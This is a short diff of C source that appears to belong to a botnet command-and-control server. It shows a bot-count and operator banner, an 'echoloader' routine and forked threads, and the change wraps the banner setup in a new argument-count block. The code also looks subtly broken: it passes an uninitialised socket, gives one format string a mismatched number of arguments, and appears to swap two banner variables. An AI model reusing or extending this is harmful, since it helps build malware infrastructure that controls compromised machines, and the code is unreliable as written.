@@ -113,6 +113,7 @@ void echoloader() {
 int main(int argc, char **argv) {
 	int x;
 	int sock;
+	if(argc < 3) {
 	pthread_t title;
 	pthread_create(&title, NULL, &TitleWriter, sock);
 		char ascii_banner_line1 [5000];
@@ -126,7 +127,7 @@ int main(int argc, char **argv) {
 		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected); 
 		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n", accounts[find_line].username);
 
-
+	}
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			echoloader();
